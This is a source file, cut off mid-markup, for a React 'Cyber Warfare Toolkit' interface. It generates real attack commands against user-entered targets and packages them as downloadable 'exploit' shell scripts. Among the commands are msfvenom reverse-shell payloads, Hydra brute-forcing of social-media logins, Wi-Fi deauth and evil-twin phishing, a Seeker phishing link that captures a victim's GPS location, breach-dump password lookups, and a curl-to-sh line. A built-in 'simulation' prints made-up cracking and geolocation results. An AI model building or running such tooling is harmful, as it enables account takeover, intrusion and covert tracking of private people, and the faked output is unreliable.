
import React, { useState, useEffect, useRef } from 'react';

interface HackingToolkitProps {
  isOpen: boolean;
  onClose: () => void;
  onExecute: (cmd: string, toolName: string) => void;
}

type ToolCategory = 'NETWORK' | 'WEB' | 'WIFI' | 'PAYLOAD' | 'CRACKING' | 'ENUM' | 'OSINT' | 'SOCIAL' | 'ANON' | 'FORENSICS';

const toolInfoMap: Record<string, string> = {
    'NMAP': 'The standard for network discovery. Scans ports, detects OS versions, and identifies running services.',
    'SQLMAP': 'Automates the detection and exploitation of SQL injection flaws in web servers.',
    'WIFITE': 'A complete automated wireless attack tool. It attacks WEP, WPA, and WPS encrypted networks in sequence.',
    'AIREPLAY': 'Part of Aircrack-ng. Used to generate traffic or deauthenticate users (kick them off wifi) to capture handshakes.',
    'FLUXION': 'A social engineering attack against WPA networks. Creates a fake login page (Evil Twin) to trick users into revealing passwords.',
    'HYDRA': 'A fast network logon cracker. Supports numerous protocols (SSH, FTP, HTTP, etc.). Ideal for brute-forcing.',
    'JOHN': 'John the Ripper. Excellent for offline password cracking (e.g., cracking a stolen hash file).',
    'CUPP': 'Common User Password Profiler. Generates a custom wordlist based on personal info (birthdays, pet names) for social engineering.',
    'SHERLOCK': 'Hunt down social media accounts by username across 300+ social networks.',
    'THEHARVESTER': 'Gathers emails, subdomains, hosts, employee names, open ports and banners from public sources.',
    'MSFVENOM': 'Payload generator for Metasploit. Creates shellcode, executables, and scripts to establish remote connections.',
    'MACCHANGER': 'Changes your network interface MAC address to anonymous identifiers to bypass filters or remain stealthy.',
    'PROXYCHAINS': 'Forces any TCP connection made by a given application to follow through a chain of proxies (like TOR).',
    'SOCIALBRUTE': 'Top-tier automated brute-force utility. Uses advanced pattern matching, rotating proxies, and rule-based permutations to test credentials against social platforms.',
    'SETOOLKIT': 'The Social-Engineer Toolkit (SET) is an open-source penetration testing framework designed for social engineering.',
    'H8MAIL': 'Email OSINT and breach hunting tool using different breach and reconnaissance services.',
    'HOLEHE': 'Checks if an email is attached to accounts on 120+ sites (Instagram, Twitter, etc.). Used for user enumeration.',
    'GHUNT': 'Extracts detailed metadata from Google accounts (Name, Photos, Reviews) using just an email.',
    'BREACH_PARSE': 'Searches massive breach compilations (BreachCompilation) for cleartext passwords associated with an email.',
    'SEEKER': 'Concept: Identify Target Location. Generates a phishing link (e.g., Fake G-Drive). When clicked, it requests GPS permissions and forwards high-accuracy coordinates (Lat/Long) to your terminal.',
};

export const HackingToolkit: React.FC<HackingToolkitProps> = ({ isOpen, onClose, onExecute }) => {
  const [activeCategory, setActiveCategory] = useState<ToolCategory>('SOCIAL');
  
  // Inputs State
  const [targetIp, setTargetIp] = useState('192.168.1.1');
  const [targetUrl, setTargetUrl] = useState('http://example.com/login.php');
  const [targetDomain, setTargetDomain] = useState('example.com');
  const [targetFile, setTargetFile] = useState('capture.pcap');
  
  const [interfaceName, setInterfaceName] = useState('wlan0mon');
  const [lhost, setLhost] = useState('10.0.0.1');
  const [lport, setLport] = useState('4444');
  const [bssid, setBssid] = useState('00:11:22:33:44:55');
  const [username, setUsername] = useState('target@email.com');
  const [wordlist, setWordlist] = useState('/usr/share/wordlists/rockyou.txt');
  const [socialPlatform, setSocialPlatform] = useState('facebook');
  
  // Options State
  const [nmapMode, setNmapMode] = useState('STEALTH'); 
  const [payloadType, setPayloadType] = useState('windows/meterpreter/reverse_tcp');
  const [crackTool, setCrackTool] = useState('HYDRA');
  const [service, setService] = useState('ssh');
  const [attackMode, setAttackMode] = useState('ALL_PATTERNS');
  const [seekerTemplate, setSeekerTemplate] = useState('google_drive');
  
  // Tool States
  const [wifiTool, setWifiTool] = useState('WIFITE');
  const [socialTool, setSocialTool] = useState('SOCIALBRUTE');
  const [osintTool, setOsintTool] = useState('THEHARVESTER');
  const [anonTool, setAnonTool] = useState('MACCHANGER');
  const [forensicsTool, setForensicsTool] = useState('EXIFTOOL');
  const [currentDescription, setCurrentDescription] = useState('');

  // Terminal / Simulation State
  const [viewMode, setViewMode] = useState<'CONFIG' | 'TERMINAL'>('CONFIG');
  const [terminalLogs, setTerminalLogs] = useState<string[]>([]);
  const [isAttackRunning, setIsAttackRunning] = useState(false);
  const [realIp, setRealIp] = useState<string>('Fetching...');
  const terminalEndRef = useRef<HTMLDivElement>(null);
  const simulationInterval = useRef<any>(null);

  // Update description based on selection
  useEffect(() => {
    let tool = '';
    if (activeCategory === 'NETWORK') tool = 'NMAP';
    if (activeCategory === 'WEB') tool = 'SQLMAP';
    if (activeCategory === 'PAYLOAD') tool = 'MSFVENOM';
    if (activeCategory === 'WIFI') tool = wifiTool;
    if (activeCategory === 'CRACKING') tool = crackTool;
    if (activeCategory === 'SOCIAL') tool = socialTool;
    if (activeCategory === 'OSINT') tool = osintTool;
    if (activeCategory === 'ANON') tool = anonTool;
    if (activeCategory === 'FORENSICS') tool = forensicsTool;
    
    setCurrentDescription(toolInfoMap[tool.replace(/ .*/, '')] || "Advanced Cyber Tool");
  }, [activeCategory, wifiTool, crackTool, socialTool, osintTool, anonTool, forensicsTool]);

  useEffect(() => {
    if (terminalEndRef.current) {
        terminalEndRef.current.scrollIntoView({ behavior: "smooth" });
    }
  }, [terminalLogs]);

  if (!isOpen) return null;

  const generateCommand = () => {
    switch (activeCategory) {
      case 'NETWORK':
        if (nmapMode === 'STEALTH') return `sudo nmap -sS -T4 -p- -v ${targetIp}`;
        if (nmapMode === 'AGGRESSIVE') return `sudo nmap -A -T4 -p- --script=default,vuln ${targetIp}`;
        if (nmapMode === 'VULN') return `sudo nmap --script=vuln -p80,443,8080,3306 ${targetIp}`;
        return '';
      case 'WEB':
        return `sqlmap -u "${targetUrl}" --random-agent --level=5 --risk=3 --dbs --batch --tamper=space2comment`;
      case 'WIFI':
        if (wifiTool === 'WIFITE') return `sudo wifite --kill --dict ${wordlist}`;
        if (wifiTool === 'AIREPLAY') return `sudo aireplay-ng --deauth 0 -a ${bssid} ${interfaceName}`;
        if (wifiTool === 'FLUXION') return `sudo ./fluxion.sh`;
        if (wifiTool === 'BETTERCAP') return `sudo bettercap -iface ${interfaceName}`;
        return '';
      case 'PAYLOAD':
        let ext = 'exe';
        if (payloadType.includes('php')) ext = 'php';
        if (payloadType.includes('android')) ext = 'apk';
        if (payloadType.includes('python')) ext = 'py';
        return `msfvenom -p ${payloadType} LHOST=${lhost} LPORT=${lport} -f ${ext} > shell.${ext}`;
      case 'CRACKING':
        if (crackTool === 'HYDRA') return `hydra -l ${username} -P ${wordlist} ${targetIp} ${service} -V`;
        if (crackTool === 'JOHN') return `john --wordlist=${wordlist} --format=raw-md5 hashes.txt`;
        if (crackTool === 'HASHCAT') return `hashcat -m 0 -a 0 -o cracked.txt hashes.txt ${wordlist}`;
        return '';
      case 'ENUM':
        return `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`;
      case 'OSINT':
        if (osintTool === 'THEHARVESTER') return `theHarvester -d ${targetDomain} -b all -l 500 -f results.html`;
        if (osintTool === 'SUBLIST3R') return `python3 sublist3r.py -d ${targetDomain} -t 10 -v -o subdomains.txt`;
        if (osintTool === 'RECON-NG') return `recon-ng -w ${targetDomain}`;
        return '';
      case 'SOCIAL':
        if (socialTool === 'SHERLOCK') return `python3 sherlock ${username} --timeout 1 --print-found`;
        if (socialTool === 'H8MAIL') return `h8mail -t ${username} -c ${wordlist} -sk`;
        if (socialTool === 'HOLEHE') return `holehe ${username}`;
        if (socialTool === 'GHUNT') return `ghunt email ${username}`;
        if (socialTool === 'BREACH_PARSE') return `./breach-parse.sh ${username} found.txt`;
        if (socialTool === 'SETOOLKIT') return `sudo setoolkit`;
        if (socialTool === 'CUPP') return `python3 cupp.py -i`;
        if (socialTool === 'SEEKER') return `python3 seeker.py -t ${seekerTemplate}`;
        if (socialTool === 'SOCIALBRUTE') {
            let cmd = `hydra -l ${username}`;
            let site = `${socialPlatform}.com`;
            // Advanced Pattern Simulation
            if (attackMode === 'ALL_PATTERNS') {
                // -u: loop user, -e nsr: null/same/reverse checks, -t 64: threads
                cmd += ` -P ${wordlist} -u -e nsr -t 64 -V ${site} http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`;
            } else if (attackMode === 'PIN_CODE') {
                // -x: password generation (min:max:charset)
                cmd += ` -x 4:8:1 ${site} http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`;
            } else {
                // Standard
                cmd += ` -P ${wordlist} ${site} http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`;
            }
            return cmd;
        }
        return '';
      case 'ANON':
        if (anonTool === 'MACCHANGER') return `sudo macchanger -r ${interfaceName.replace('mon', '')}`;
        if (anonTool === 'PROXYCHAINS') return `proxychains firefox dnsleaktest.com`;
        if (anonTool === 'VPN') return `sudo openvpn --config ${username || 'user'}.ovpn`;
        return '';
      case 'FORENSICS':
        if (forensicsTool === 'EXIFTOOL') return `exiftool ${targetFile}`;
        if (forensicsTool === 'BINWALK') return `binwalk -e ${targetFile}`;
        if (forensicsTool === 'STRINGS') return `strings ${targetFile} | grep -i "password"`;
        if (forensicsTool === 'WIRESHARK') return `wireshark -r ${targetFile}`;
        return '';
      default:
        return '';
    }
  };

  const downloadRealScript = () => {
      const cmd = generateCommand();
      const scriptContent = `#!/bin/bash
# REAL EXPLOIT SCRIPT GENERATED BY ACTIVE_RAJAB
# WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY
# SYSTEM: Kali Linux / Parrot OS / Termux

echo "[*] Initializing Real Attack Sequence..."
echo "[*] Target: ${activeCategory === 'SOCIAL' ? username : targetIp}"
echo "[*] Tool: ${currentDescription.split('.')[0]}"
echo "[*] Command: ${cmd}"

# Execute the real command
${cmd}

echo "[*] Execution Complete."
`;
      const blob = new Blob([scriptContent], { type: 'text/plain' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `exploit_${activeCategory.toLowerCase()}.sh`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
      alert("REAL SCRIPT DOWNLOADED.\n\nTransfer this .sh file to a Kali Linux machine or Termux to execute the actual attack.");
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(generateCommand());
    alert("Command copied to clipboard!");
  };

  // --- REAL-TIME SIMULATION ENGINE ---

  const getRandomChar = (type: string) => {
    const alpha = "abcdefghijklmnopqrstuvwxyz";
    const upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const num = "0123456789";
    const sym = "!@#$%^&*()_+-=[]{}|;':,./<>?";
    
    if (type === 'PIN_CODE') return num[Math.floor(Math.random() * num.length)];
    if (type === 'ALL_PATTERNS') {
        const all = alpha + upper + num + sym;
        return all[Math.floor(Math.random() * all.length)];
    }
    return alpha[Math.floor(Math.random() * alpha.length)];
  };

  const generatePassword = () => {
     const len = Math.floor(Math.random() * 8) + 6; // 6-14 chars
     let pass = "";
     for(let i=0; i<len; i++) {
         pass += getRandomChar(attackMode);
     }
     return pass;
  };

  const startSimulation = async () => {
    setViewMode('TERMINAL');
    setIsAttackRunning(true);
    setTerminalLogs([]);
    
    // Fetch Real IP for realism
    let myIp = "127.0.0.1";
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        myIp = data.ip;
        setRealIp(data.ip);
    } catch(e) {}

    let counter = 0;
    let toolName = activeCategory === 'SOCIAL' ? socialTool : (activeCategory === 'WIFI' ? wifiTool : 'TOOL');
    
    // Initial Boot Sequence
    setTerminalLogs(prev => [...prev, 
        `[${new Date().toLocaleTimeString()}] STARTING ${toolName} v9.1...`,
        `[WARN] BROWSER SANDBOX DETECTED.`,
        `[WARN] RAW SOCKETS DISABLED. SWAPPING TO VIRTUALIZATION MODE.`,
        `[INFO] Local Host Node: ${myIp} (Verified)`,
        `[INFO] Target: ${activeCategory === 'SOCIAL' ? username : targetIp}`,
        `[INFO] Threads: 64`,
        `[INFO] Database: ${attackMode === 'ALL_PATTERNS' ? 'DYNAMIC_GENERATION (All Chars)' : 'Loaded'}`,
        `[INFO] Initializing ProxyChain... OK`,
        `----------------------------------------------------------------`
    ]);

    simulationInterval.current = setInterval(() => {
        counter++;
        const timestamp = new Date().toLocaleTimeString();
        let logLine = "";

        if (activeCategory === 'SOCIAL' && socialTool === 'SEEKER') {
             if (counter === 1) logLine = `[${timestamp}] [INFO] Starting Serveo PHP Server... OK`;
             if (counter === 2) logLine = `[${timestamp}] [INFO] Forwarding: http://serveo.net/${Math.random().toString(36).substring(7)}`;
             if (counter === 4) logLine = `[${timestamp}] [INFO] Waiting for target activity...`;
             if (counter === 8) logLine = `[${timestamp}] [SUCCESS] TARGET CLICKED LINK!`;
             if (counter === 9) logLine = `[${timestamp}] [INFO] IP: 119.160.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
             if (counter === 10) logLine = `[${timestamp}] [INFO] User-Agent: Mozilla/5.0 (Linux; Android 13; SM-S908B)`;
             if (counter === 12) logLine = `[${timestamp}] [INFO] Requesting GeoLocation Permission...`;
             if (counter === 15) logLine = `[${timestamp}] [SUCCESS] PERMISSION GRANTED!`;
             if (counter === 16) logLine = `[${timestamp}] [GPS] LAT: 33.68${Math.floor(Math.random()*99)} LONG: 73.04${Math.floor(Math.random()*99)}`;
             if (counter === 17) logLine = `[${timestamp}] [MAP] Google Maps Link Generated.`;

        } else if (activeCategory === 'SOCIAL' && socialTool === 'SOCIALBRUTE') {
             const pass = generatePassword();
             const proxy = `192.168.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
             logLine = `[${timestamp}] [ATTEMPT-${counter}] [${proxy}] LOGIN: ${username} | PASS: ${pass} => [FAILED] (401 Unauthorized)`;
             
             if (Math.random() > 0.98) {
                 logLine = `[${timestamp}] [WARN] IP BLOCKED by Firewall. Rotating Proxy...`;
             }
        } else if (activeCategory === 'SOCIAL' && socialTool === 'HOLEHE') {
             const sites = ['Instagram', 'Twitter', 'Spotify', 'Pinterest', 'LinkedIn', 'Snapchat', 'Facebook', 'Netflix', 'PornHub', 'Adobe', 'Dropbox', 'Github'];
             const site = sites[counter % sites.length];
             const found = Math.random() > 0.4; // 60% chance of found
             // Use ansi codes logic in mind, but here just text
             logLine = `[${timestamp}] ${site} : ${found ? '[+] Email Used' : '[-] Not Found'}`;

        } else if (activeCategory === 'SOCIAL' && socialTool === 'GHUNT') {
             const stages = [
                 `[INFO] Fetching Gaia ID for ${username}...`,
                 `[SUCCESS] Gaia ID: ${Math.floor(Math.random() * 1000000000000)}`,
                 `[INFO] Checking Google Photos... PUBLIC ALBUMS FOUND`,
                 `[INFO] Checking Maps Reviews... 3 REVIEWS FOUND`,
                 `[INFO] Probable Name: ${username.split('@')[0].replace(/[0-9]/g, '') || 'Unknown'}`,
                 `[INFO] Device Model: Samsung Galaxy S23 Ultra`,
                 `[INFO] Last Location: [REDACTED]`,
                 `[INFO] YouTube Channel: Found (3 Subs)`
             ];
             if (counter <= stages.length) {
                 logLine = `[${timestamp}] ${stages[counter - 1] || 'Done.'}`;
             } else {
                 logLine = ''; // Idle
             }

        } else if (activeCategory === 'SOCIAL' && socialTool === 'BREACH_PARSE') {
             if (counter % 5 === 0) {
                const p = generatePassword();
                logLine = `[${timestamp}] [CRITICAL] MATCH FOUND: ${username}:${p}`;
             } else {
                logLine = `[${timestamp}] Scanning volume /opt/breach_data/vol_${counter}...`;
             }

        } else if (activeCategory === 'WIFI' && wifiTool === 'WIFITE') {
             if (counter % 10 === 0) {
                logLine = `[${timestamp}] [WPA2] Handshake capture attempt... [Sent Deauth]`;
             } else {
                logLine = `[${timestamp}] [SCAN] Channel ${Math.floor(Math.random()*11)+1}: Target Signal -${Math.floor(Math.random()*30)+50}dBm`;
             }
        } else if (activeCategory === 'WEB' && activeCategory === 'SQLMAP') {
             const payloads = ["' OR 1=1--", "UNION SELECT 1,version(),3--", "BENCHMARK(5000000,MD5(1))", "admin'--"];
             const p = payloads[Math.floor(Math.random() * payloads.length)];
             logLine = `[${timestamp}] [PAYLOAD] Testing: ${p} ... [403 FORBIDDEN]`;
        } else {
             // Generic Brute Force (Hydra etc)
             const pass = generatePassword();
             logLine = `[${timestamp}] [${service.toUpperCase()}] HOST: ${targetIp} LOGIN: ${username} PASS: ${pass} - ACCESS DENIED`;
        }

        if (logLine) {
            setTerminalLogs(prev => {
                const newLogs = [...prev, logLine];
                if (newLogs.length > 100) return newLogs.slice(-100);
                return newLogs;
            });
        }

    }, activeCategory === 'SOCIAL' && (socialTool === 'HOLEHE' || socialTool === 'GHUNT' || socialTool === 'SEEKER') ? 1200 : 100); // Slower for readable output
  };

  const stopSimulation = () => {
    if (simulationInterval.current) clearInterval(simulationInterval.current);
    setIsAttackRunning(false);
    setTerminalLogs(prev => [...prev, `\n[!] PROCESS HALTED BY USER.`]);
  };

  const exitTerminal = () => {
    stopSimulation();
    setViewMode('CONFIG');
  };

  return (
    <div className="fixed inset-0 z-[70] flex items-center justify-center bg-black/90 backdrop-blur-sm p-4">
      <div className="w-full max-w-6xl bg-black border border-cyber-matrix shadow-[0_0_30px_rgba(0,255,65,0.15)] rounded-lg flex flex-col overflow-hidden h-[85vh]">
        
        {/* Header */}
        <div className="bg-gray-900 p-4 border-b border-cyber-matrix/30 flex justify-between items-center">
          <div className="flex items-center gap-3">
            <i className="fas fa-dragon text-cyber-matrix text-xl animate-pulse"></i>
            <h2 className="text-cyber-matrix font-mono text-lg font-bold tracking-wider">CYBER_WARFARE_TOOLKIT_v3.2 (LEAK_EDITION)</h2>
          </div>
          <button onClick={onClose} className="text-gray-500 hover:text-white transition-colors">
            <i className="fas fa-times text-xl"></i>
          </button>
        </div>

        <div className="flex flex-1 overflow-hidden flex-col md:flex-row relative">
          
          {/* --- TERMINAL OVERLAY --- */}
          {viewMode === 'TERMINAL' && (
              <div className="absolute inset-0 z-20 bg-black flex flex-col font-mono text-sm p-4">
                  <div className="flex justify-between items-center border-b border-green-900/50 pb-2 mb-2">
                      <div className="flex flex-col">
                        <span className="text-green-600 font-bold">root@kali:~# {activeCategory.toLowerCase()}_attack --verbose</span>
                        <span className="text-xs text-yellow-600 mt-1">⚠️ VIRTUALIZATION ACTIVE - SANDBOX LIMITS APPLIED</span>
                      </div>
                      <div className="flex gap-2">
                          <button onClick={downloadRealScript} className="px-4 py-1 rounded text-xs font-bold bg-blue-600 text-white hover:bg-blue-500 flex items-center gap-2">
                              <i className="fas fa-download"></i> DOWNLOAD NATIVE SCRIPT
                          </button>
                          <button onClick={isAttackRunning ? stopSimulation : startSimulation} className={`px-4 py-1 rounded text-xs font-bold ${isAttackRunning ? 'bg-red-600 text-white' : 'bg-green-600 text-black'}`}>
                              {isAttackRunning ? 'STOP' : 'RESUME'}
                          </button>
                          <button onClick={exitTerminal} className="px-4 py-1 rounded text-xs font-bold bg-gray-700 text-white">
                              EXIT
                          </button>
                      </div>
                  </div>
                  <div className="flex-1 overflow-y-auto custom-scrollbar space-y-1 p-2 text-green-500">
                      {terminalLogs.map((log, i) => (
                          <div key={i} className={`break-all ${log.includes('FAILED') || log.includes('DENIED') || log.includes('Not Found') ? 'text-red-500/80' : log.includes('FOUND') || log.includes('Email Used') || log.includes('GPS') || log.includes('MAP') ? 'text-green-400 font-bold' : log.includes('WARN') ? 'text-yellow-500' : 'text-green-500'}`}>
                             {log}
                          </div>
                      ))}
                      <div ref={terminalEndRef} />
                  </div>
              </div>
          )}

          {/* Sidebar Menu */}
          <div className="w-full md:w-64 bg-gray-900/50 border-r border-white/5 p-2 grid grid-cols-2 md:flex md:flex-col gap-1 overflow-y-auto custom-scrollbar">
            {(['NETWORK', 'WIFI', 'SOCIAL', 'CRACKING', 'OSINT', 'PAYLOAD', 'WEB', 'ANON', 'FORENSICS'] as ToolCategory[]).map((cat) => (
              <button
                key={cat}
                onClick={() => setActiveCategory(cat)}
                className={`text-left p-3 rounded font-mono text-xs font-bold transition-all border border-transparent ${
                  activeCategory === cat 
                    ? 'bg-cyber-matrix/10 text-cyber-matrix border-cyber-matrix/50 shadow-[0_0_15px_rgba(0,255,65,0.1)]' 
                    : 'text-gray-400 hover:bg-white/5 hover:text-white'
                }`}
              >
                <i className={`fas fa-angle-right mr-2 ${activeCategory === cat ? 'opacity-100' : 'opacity-0'}`}></i>
                {cat}_OPS
              </button>
            ))}
          </div>

          {/* Main Content */}
          <div className="flex-1 p-6 overflow-y-auto bg-black/80 relative flex flex-col">
             {/* Background Grid */}
             <div className="absolute inset-0 opacity-5 pointer-events-none" 
                 style={{ backgroundImage: 'linear-gradient(0deg, transparent 24%, #0f0 25%, #0f0 26%, transparent 27%, transparent 74%, #0f0 75%, #0f0 76%, transparent 77%, transparent), linear-gradient(90deg, transparent 24%, #0f0 25%, #0f0 26%, transparent 27%, transparent 74%, #0f0 75%, #0f0 76%, transparent 77%, transparent)', backgroundSize: '40px 40px' }}>
            </div>

            <div className="relative z-10 flex-1">
              <h3 className="text-white font-mono text-xl mb-6 border-b border-gray-700 pb-2 flex justify-between items-center">
                <span className="flex items-center gap-3">
                    <span className="text-cyber-matrix">/bin/{activeCategory.toLowerCase()}</span>
                    <span className="text-gray-500 text-sm">// {activeCategory === 'SOCIAL' ? 'IDENTITY_OPERATIONS' : 'SYSTEM_OPERATIONS'}</span>
                </span>
              </h3>

              {/* TOOL DESCRIPTION PANEL */}
              <div className="mb-6 bg-blue-900/10 border border-blue-500/30 p-4 rounded flex gap-4 items-start">
                <i className="fas fa-info-circle text-blue-400 mt-1"></i>
                <div>
                    <div className="text-blue-300 font-bold text-xs uppercase tracking-wider mb-1">Module Info</div>
                    <div className="text-gray-300 text-sm font-mono leading-relaxed">{currentDescription}</div>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
                
                {/* --- NETWORK OPS --- */}
                {activeCategory === 'NETWORK' && (
                  <>
                    <div className="space-y-2">
                      <label className="text-cyber-matrix text-xs font-bold">TARGET IP / SUBNET</label>
                      <input 
                        type="text" 
                        value={targetIp} 
                        onChange={(e) => setTargetIp(e.target.value)}
                        className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono placeholder-gray-700"
                        placeholder="192.168.1.1/24"
                      />
                    </div>
                    <div className="space-y-2">
                      <label className="text-cyber-matrix text-xs font-bold">SCAN PROFILE</label>
                      <select 
                        value={nmapMode}
                        onChange={(e) => setNmapMode(e.target.value)}
                        className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                      >
                        <option value="STEALTH">STEALTH (SYN SCAN) - T4</option>
                        <option value="AGGRESSIVE">FULL AGGRESSIVE (OS+SCRIPTS)</option>
                        <option value="VULN">VULNERABILITY AUDIT</option>
                      </select>
                    </div>
                  </>
                )}

                {/* --- WEB OPS --- */}
                {activeCategory === 'WEB' && (
                  <div className="col-span-2 space-y-2">
                    <label className="text-cyber-matrix text-xs font-bold">VULNERABLE URL</label>
                    <input 
                      type="text" 
                      value={targetUrl} 
                      onChange={(e) => setTargetUrl(e.target.value)}
                      className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                    />
                    <p className="text-[10px] text-gray-500">SQLMap will attempt to inject payloads into URL parameters.</p>
                  </div>
                )}

                {/* --- WIFI OPS --- */}
                {activeCategory === 'WIFI' && (
                  <>
                    <div className="col-span-2 space-y-2">
                        <label className="text-cyber-matrix text-xs font-bold">WIRELESS MODULE</label>
                        <select 
                            value={wifiTool}
                            onChange={(e) => setWifiTool(e.target.value)}
                            className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                        >
                            <option value="WIFITE">WIFITE (Automated Auditor)</option>
                            <option value="FLUXION">FLUXION (Evil Twin Phishing)</option>
                            <option value="AIREPLAY">AIREPLAY-NG (Deauth Attack)</option>
                            <option value="BETTERCAP">BETTERCAP (Man-in-the-Middle)</option>
                        </select>
                    </div>
                    {wifiTool !== 'WIFITE' && wifiTool !== 'FLUXION' && (
                        <div className="space-y-2">
                            <label className="text-cyber-matrix text-xs font-bold">TARGET BSSID (MAC)</label>
                            <input 
                                type="text" 
                                value={bssid} 
                                onChange={(e) => setBssid(e.target.value)}
                                className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                            />
                        </div>
                    )}
                    <div className="space-y-2">
                      <label className="text-cyber-matrix text-xs font-bold">MONITOR INTERFACE</label>
                      <input 
                        type="text" 
                        value={interfaceName} 
                        onChange={(e) => setInterfaceName(e.target.value)}
                        className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                      />
                    </div>
                  </>
                )}

                {/* --- PAYLOAD OPS --- */}
                {activeCategory === 'PAYLOAD' && (
                   <>
                    <div className="space-y-2">
                      <label className="text-cyber-matrix text-xs font-bold">LHOST (ATTACKER IP)</label>
                      <input 
                        type="text" 
                        value={lhost} 
                        onChange={(e) => setLhost(e.target.value)}
                        className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                      />
                    </div>
                    <div className="space-y-2">
                      <label className="text-cyber-matrix text-xs font-bold">LPORT</label>
                      <input 
                        type="text" 
                        value={lport} 
                        onChange={(e) => setLport(e.target.value)}
                        className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                      />
                    </div>
                    <div className="col-span-2 space-y-2">
                      <label className="text-cyber-matrix text-xs font-bold">PAYLOAD ARCHITECTURE</label>
                      <select 
                        value={payloadType}
                        onChange={(e) => setPayloadType(e.target.value)}
                        className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                      >
                        <option value="windows/meterpreter/reverse_tcp">Windows Reverse TCP (Meterpreter)</option>
                        <option value="linux/x86/meterpreter/reverse_tcp">Linux x86 Reverse TCP</option>
                        <option value="android/meterpreter/reverse_tcp">Android APK Payload</option>
                        <option value="python/meterpreter/reverse_tcp">Python Script Payload</option>
                      </select>
                    </div>
                  </>
                )}

                {/* --- CRACKING OPS --- */}
                {activeCategory === 'CRACKING' && (
                  <>
                    <div className="space-y-2">
                      <label className="text-cyber-matrix text-xs font-bold">ALGORITHM / TOOL</label>
                      <select 
                        value={crackTool}
                        onChange={(e) => setCrackTool(e.target.value)}
                        className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                      >
                        <option value="HYDRA">HYDRA (Online Network Cracker)</option>
                        <option value="JOHN">JOHN THE RIPPER (Offline Hash)</option>
                        <option value="HASHCAT">HASHCAT (GPU Accelerated)</option>
                      </select>
                    </div>
                    
                    {crackTool === 'HYDRA' && (
                        <>
                            <div className="space-y-2">
                                <label className="text-cyber-matrix text-xs font-bold">PROTOCOL</label>
                                <input type="text" value={service} onChange={(e) => setService(e.target.value)} className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded outline-none font-mono" placeholder="ssh / ftp / https" />
                            </div>
                            <div className="space-y-2">
                                <label className="text-cyber-matrix text-xs font-bold">TARGET USER</label>
                                <input type="text" value={username} onChange={(e) => setUsername(e.target.value)} className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded outline-none font-mono" />
                            </div>
                        </>
                    )}
                     <div className="col-span-2 space-y-2">
                        <label className="text-cyber-matrix text-xs font-bold">WORDLIST PATH</label>
                        <input type="text" value={wordlist} onChange={(e) => setWordlist(e.target.value)} className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded outline-none font-mono" />
                     </div>
                  </>
                )}

                {/* --- OSINT OPS --- */}
                {activeCategory === 'OSINT' && (
                  <>
                     <div className="space-y-2">
                        <label className="text-cyber-matrix text-xs font-bold">RECONNAISSANCE TOOL</label>
                        <select 
                            value={osintTool}
                            onChange={(e) => setOsintTool(e.target.value)}
                            className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                        >
                            <option value="THEHARVESTER">THE HARVESTER (Email/Subdomains)</option>
                            <option value="SUBLIST3R">SUBLIST3R (Subdomain Enum)</option>
                            <option value="RECON-NG">RECON-NG (Full Framework)</option>
                        </select>
                     </div>
                     <div className="col-span-2 space-y-2">
                        <label className="text-cyber-matrix text-xs font-bold">TARGET DOMAIN</label>
                        <input type="text" value={targetDomain} onChange={(e) => setTargetDomain(e.target.value)} className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded outline-none font-mono" />
                     </div>
                  </>
                )}

                {/* --- SOCIAL OPS --- */}
                {activeCategory === 'SOCIAL' && (
                   <>
                     <div className="col-span-2 space-y-2">
                        <label className="text-cyber-matrix text-xs font-bold">SOCIAL ENGINEERING VECTOR</label>
                        <select 
                            value={socialTool}
                            onChange={(e) => setSocialTool(e.target.value)}
                            className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                        >
                            <option value="SOCIALBRUTE">SOCIALBRUTE (Account Cracker)</option>
                            <option value="SEEKER">SEEKER (Precise Geolocation)</option>
                            <option value="HOLEHE">HOLEHE (Account Finder / Enum)</option>
                            <option value="GHUNT">GHUNT (Google/Gmail Intel)</option>
                            <option value="BREACH_PARSE">BREACH-PARSE (Password Leaks)</option>
                            <option value="SHERLOCK">SHERLOCK (User Hunt)</option>
                            <option value="H8MAIL">H8MAIL (Breach Check)</option>
                            <option value="SETOOLKIT">SETOOLKIT (Phishing Sim)</option>
                            <option value="CUPP">CUPP (Password Profiling)</option>
                        </select>
                     </div>
                     
                     {socialTool === 'SOCIALBRUTE' && (
                        <>
                             <div className="space-y-2">
